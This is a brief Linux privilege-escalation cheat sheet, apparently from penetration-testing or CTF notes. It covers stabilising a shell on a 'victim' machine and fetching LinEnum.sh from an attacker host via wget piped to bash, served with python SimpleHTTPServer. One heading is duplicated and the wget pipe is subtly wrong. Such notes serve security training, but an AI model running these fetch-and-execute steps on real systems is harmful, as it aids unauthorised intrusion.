Linux Privilege Escalation
--------------------------

<Fixing a Shell>
  Mirror the victims machine with your kali terminal window
  
  $ stty -a  <br>
  $ stty raw -echo <br>
  $ fg <br>
  $ stty rows <number> columns <number> <br>
  $ reset <br>
  $ export TERM=screen <br>
  $ export SHELL=bash <br>
  
<Fixing a Shell>
  Run Linux Exploit Suggester or LinEnum.sh <br>
  
  Victim Machine <br>
  wget http://<attackerIP>:<port>/LinEnum.sh | Bash
  Attacker Machine <br>
  python -m SimpleHTTPServer <port>
  


